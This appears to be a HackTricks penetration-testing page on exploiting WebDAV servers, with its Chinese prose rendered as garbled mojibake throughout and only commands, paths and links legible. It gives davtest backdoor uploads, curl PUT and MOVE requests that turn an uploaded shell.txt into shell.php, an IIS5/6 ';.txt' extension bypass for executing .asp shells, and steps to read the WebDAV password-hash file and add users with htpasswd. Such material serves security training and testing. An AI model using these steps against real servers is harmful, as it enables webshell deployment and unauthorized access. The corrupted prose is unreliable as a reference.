# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
{% endhint %}

åœ¨å¤„ç† **å¯ç”¨ WebDav çš„ HTTP æœåŠ¡å™¨** æ—¶ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰æ­£ç¡®çš„ **å‡­æ®**ï¼Œé€šå¸¸é€šè¿‡ **HTTP åŸºæœ¬è®¤è¯** éªŒè¯ï¼Œåˆ™å¯ä»¥ **æ“çºµæ–‡ä»¶**ã€‚æ§åˆ¶æ­¤ç±»æœåŠ¡å™¨é€šå¸¸æ¶‰åŠ **ä¸Šä¼ å’Œæ‰§è¡Œ webshell**ã€‚

è®¿é—® WebDav æœåŠ¡å™¨é€šå¸¸éœ€è¦ **æœ‰æ•ˆå‡­æ®**ï¼Œ[**WebDav æš´åŠ›ç ´è§£**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) æ˜¯è·å–å®ƒä»¬çš„å¸¸ç”¨æ–¹æ³•ã€‚

ä¸ºäº†å…‹æœæ–‡ä»¶ä¸Šä¼ çš„é™åˆ¶ï¼Œç‰¹åˆ«æ˜¯é‚£äº›é˜»æ­¢æœåŠ¡å™¨ç«¯è„šæœ¬æ‰§è¡Œçš„é™åˆ¶ï¼Œæ‚¨å¯ä»¥ï¼š

* å¦‚æœæ²¡æœ‰é™åˆ¶ï¼Œ**ç›´æ¥ä¸Šä¼ ** å¸¦æœ‰ **å¯æ‰§è¡Œæ‰©å±•å** çš„æ–‡ä»¶ã€‚
* **é‡å‘½å** ä¸Šä¼ çš„éå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚ .txtï¼‰ä¸ºå¯æ‰§è¡Œæ‰©å±•åã€‚
* **å¤åˆ¶** ä¸Šä¼ çš„éå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°†å…¶æ‰©å±•åæ›´æ”¹ä¸ºå¯æ‰§è¡Œçš„æ‰©å±•åã€‚

## DavTest

**Davtest** å°è¯• **ä¸Šä¼ å¤šä¸ªä¸åŒæ‰©å±•åçš„æ–‡ä»¶** å¹¶ **æ£€æŸ¥** æ‰©å±•åæ˜¯å¦ **è¢«æ‰§è¡Œ**ï¼š
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../.gitbook/assets/image (851).png>)

è¿™å¹¶ä¸æ„å‘³ç€ **.txt** å’Œ **.html æ‰©å±•åè¢«æ‰§è¡Œ**ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ **é€šè¿‡ç½‘ç»œè®¿é—®è¿™äº›æ–‡ä»¶**ã€‚

## Cadaver

ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…· **è¿æ¥åˆ° WebDav** æœåŠ¡å™¨å¹¶æ‰§è¡Œæ“ä½œï¼ˆå¦‚ **ä¸Šä¼ **ã€**ç§»åŠ¨** æˆ– **åˆ é™¤**ï¼‰ **æ‰‹åŠ¨**ã€‚
```
cadaver <IP>
```
## PUT è¯·æ±‚
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE è¯·æ±‚
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## IIS5/6 WebDav æ¼æ´

è¿™ä¸ªæ¼æ´éå¸¸æœ‰è¶£ã€‚**WebDav** ä¸å…è®¸ **ä¸Šä¼ ** æˆ– **é‡å‘½å** æ‰©å±•åä¸º **.asp** çš„æ–‡ä»¶ã€‚ä½†ä½ å¯ä»¥é€šè¿‡åœ¨åç§°æœ«å°¾ **æ·»åŠ ** **";.txt"** æ¥ **ç»•è¿‡** è¿™ä¸ªé™åˆ¶ï¼Œæ–‡ä»¶å°†è¢« **æ‰§è¡Œ**ï¼Œå°±åƒå®ƒæ˜¯ä¸€ä¸ª .asp æ–‡ä»¶ï¼ˆä½ ä¹Ÿå¯ä»¥ **ä½¿ç”¨ ".html" è€Œä¸æ˜¯ ".txt"**ï¼Œä½† **ä¸è¦å¿˜è®° ";"**ï¼‰ã€‚

ç„¶åä½ å¯ä»¥å°†ä½ çš„ shell ä½œä¸ºä¸€ä¸ª ".**txt" æ–‡ä»¶** **ä¸Šä¼ **ï¼Œå¹¶ **å¤åˆ¶/ç§»åŠ¨** åˆ°ä¸€ä¸ª ".asp;.txt" æ–‡ä»¶ã€‚é€šè¿‡ç½‘ç»œæœåŠ¡å™¨è®¿é—®è¯¥æ–‡ä»¶æ—¶ï¼Œå®ƒå°†è¢« **æ‰§è¡Œ**ï¼ˆcadaver ä¼šè¯´ç§»åŠ¨æ“ä½œæ²¡æœ‰æˆåŠŸï¼Œä½†å®é™…ä¸Šæ˜¯æˆåŠŸçš„ï¼‰ã€‚

![](<../../.gitbook/assets/image (1092).png>)

## åç½®å‡­è¯

å¦‚æœ Webdav ä½¿ç”¨çš„æ˜¯ Apache æœåŠ¡å™¨ï¼Œä½ åº”è¯¥æŸ¥çœ‹ Apache ä¸­é…ç½®çš„ç½‘ç«™ã€‚é€šå¸¸ï¼š\
_**/etc/apache2/sites-enabled/000-default**_

åœ¨å…¶ä¸­ä½ å¯èƒ½ä¼šæ‰¾åˆ°ç±»ä¼¼çš„å†…å®¹ï¼š
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
å¦‚æ‚¨æ‰€è§ï¼Œå­˜åœ¨å…·æœ‰æœ‰æ•ˆ**å‡­æ®**çš„**webdav**æœåŠ¡å™¨çš„æ–‡ä»¶ï¼š
```
/etc/apache2/users.password
```
åœ¨è¿™ç±»æ–‡ä»¶ä¸­ï¼Œæ‚¨å°†æ‰¾åˆ° **ç”¨æˆ·å** å’Œ **å¯†ç ** çš„ **å“ˆå¸Œ**ã€‚è¿™äº›æ˜¯ webdav æœåŠ¡å™¨ç”¨äºéªŒè¯ç”¨æˆ·çš„å‡­æ®ã€‚

æ‚¨å¯ä»¥å°è¯• **ç ´è§£** å®ƒä»¬ï¼Œæˆ–è€…å¦‚æœå‡ºäºæŸç§åŸå› æ‚¨æƒ³è¦ **è®¿é—®** **webdav** æœåŠ¡å™¨ï¼Œå¯ä»¥ **æ·»åŠ æ›´å¤š**ï¼š
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
è¦æ£€æŸ¥æ–°å‡­æ®æ˜¯å¦æœ‰æ•ˆï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## References

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)
{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
